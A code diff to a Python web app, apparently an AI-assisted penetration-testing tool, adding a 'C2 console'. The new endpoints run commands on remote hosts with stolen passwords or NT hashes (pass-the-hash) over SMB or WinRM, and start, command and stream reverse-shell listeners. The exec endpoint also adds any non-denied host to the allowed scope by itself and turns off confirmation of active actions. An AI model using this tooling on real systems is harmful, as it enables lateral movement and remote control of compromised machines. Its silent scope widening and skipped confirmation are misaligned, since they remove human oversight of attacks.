@@ -87,6 +87,8 @@ def create_app(config_path: str = "config.yaml"):
         custom_tools.configure(s["dir"])
         from ..llm import calllog
         calllog.configure(f"{s['dir']}/ai_calls.jsonl")
+        from . import listeners
+        listeners.configure(s["dir"])
         return s["dir"]
 
     def _scope() -> Scope:
@@ -641,6 +643,97 @@ def create_app(config_path: str = "config.yaml"):
             raise HTTPException(404, "Custom tool not found.")
         custom_tools.save(kept)
         return {"deleted": name}
+
+    # ---- C2 console: credentialed exec + reverse-shell listeners --------- #
+    @app.post("/api/exec")
+    def run_exec(body: dict):
+        """Run a command on a host with a compromised credential — over SMB
+        (admin exec) or WinRM, using a password or an NT hash (pass-the-hash)."""
+        from ..tools.registry import default_registry
+        from ..tools.base import ToolContext
+        host = (body.get("host") or "").strip()
+        command = (body.get("command") or "").strip()
+        if not host or not command:
+            raise HTTPException(400, "host and command are required.")
+        sc = _scope()
+        if sc.is_denied(host):
+            raise HTTPException(403, f"'{host}' is on the deny list.")
+        if not sc.is_allowed(host):
+            sc.add_allow(host)
+        proto = "winrm" if body.get("protocol") == "winrm" else "smb"
+        reg = default_registry(cfg.tools)
+        tool = reg.get("netexec_winrm" if proto == "winrm" else "netexec_smb")
+        if tool is None:
+            raise HTTPException(400, "NetExec (nxc) is not installed.")
+        kw = {"target": host, "username": (body.get("username") or "").strip(),
+              "domain": (body.get("domain") or "").strip() or store.facts().get("domain", ""),
+              "command": command}
+        if body.get("auth") == "hash":
+            kw["hash"] = (body.get("secret") or "").strip()
+        else:
+            kw["password"] = body.get("secret") or ""
+        ctx = ToolContext(scope=sc, confirm_active_actions=False)
+        r = tool.run(ctx, **kw)
+        out = r.raw_output or r.summary or ""
+        return {"ok": r.ok, "pwned": "Pwn3d!" in out, "protocol": proto, "output": out}
+
+    @app.get("/api/listeners")
+    def get_listeners():
+        from . import listeners
+        return listeners.list_listeners()
+
+    @app.post("/api/listeners")
+    def start_listener(body: dict):
+        from . import listeners
+        try:
+            port = int(body.get("port"))
+        except (TypeError, ValueError):
+            raise HTTPException(400, "A numeric port is required.")
+        if not (1 <= port <= 65535):
+            raise HTTPException(400, "Port must be 1-65535.")
+        return listeners.start(port)
+
+    @app.post("/api/listeners/{lid}/send")
+    def send_listener(lid: str, body: dict):
+        from . import listeners
+        if not listeners.send(lid, body.get("command", "")):
+            raise HTTPException(404, "Listener not found.")
+        return {"ok": True}
+
+    @app.post("/api/listeners/{lid}/stop")
+    def stop_listener(lid: str):
+        from . import listeners
+        listeners.stop(lid)
+        return {"ok": True}
+
+    @app.get("/api/listeners/{lid}/stream")
+    async def listener_stream(lid: str, request: Request):
+        from . import listeners
+        lp = listeners.log_path(lid)
+
+        async def gen():
+            pos = 0
+            for _ in range(50):
+                if lp.exists():
+                    break
+                await asyncio.sleep(0.1)
+            while True:
+                if await request.is_disconnected():
+                    break
+                chunk = ""
+                if lp.exists():
+                    with open(lp, "r", encoding="utf-8", errors="replace") as f:
+                        f.seek(pos)
+                        chunk = f.read()
+                        pos = f.tell()
+                if chunk:
+                    for line in chunk.splitlines():
+                        yield f"data: {line}\n\n"
+                await asyncio.sleep(0.5)
+
+        return StreamingResponse(gen(), media_type="text/event-stream",
+                                 headers={"Cache-Control": "no-cache",
+                                          "X-Accel-Buffering": "no"})
 
     # ---- reports ---------------------------------------------------------- #
     @app.get("/api/reports")
